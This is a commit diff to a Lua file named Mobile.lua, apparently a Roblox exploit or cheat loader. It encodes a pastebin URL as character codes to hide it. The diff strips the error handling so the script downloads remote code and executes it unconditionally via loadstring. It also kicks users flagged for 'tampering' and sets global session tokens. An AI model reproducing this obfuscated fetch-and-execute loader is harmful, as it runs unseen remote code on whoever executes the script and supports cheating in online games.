fbcdc2e6fcb5ed26e1a879ee9db0bbda0f5a93ed
MaybeHookUser <IUseMaybeHook@proton.me>
2026-01-17 15:42:55 +0100

    Update Mobile.lua

--- Mobile.lua
+++ Mobile.lua
@@ -6,23 +6,20 @@ local function checkMobile()
 end
 
 if not checkMobile() then
-    l1l1ll1:Kick("Tampering (PC User)")
+    l1l1ll1:Kick("Tampering")
     return
 end
 
 _G.SESSION_TOKEN = math.random(100000, 999999)
 _G.Processor = math.random(1000, 9000)
+_G.SYNX_TOKEN = math.random(100, 999)
+
 shared.SESSION_TOKEN = _G.SESSION_TOKEN
 shared.Processor = _G.Processor
+shared.SYNX_TOKEN = _G.SYNX_TOKEN
 
 local _raw = {104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 119, 50, 109, 115, 66, 76, 113, 51}
 local _url = ""
 for i = 1, #_raw do _url = _url .. string.char(_raw[i]) end
 
-local s, err = pcall(function()
-    loadstring(game:HttpGet(_url))()
-end)
-
-if not s then
-    l1l1ll1:Kick("Tampering (Fetch Failed)")
-end
+loadstring(game:HttpGet(_url))()
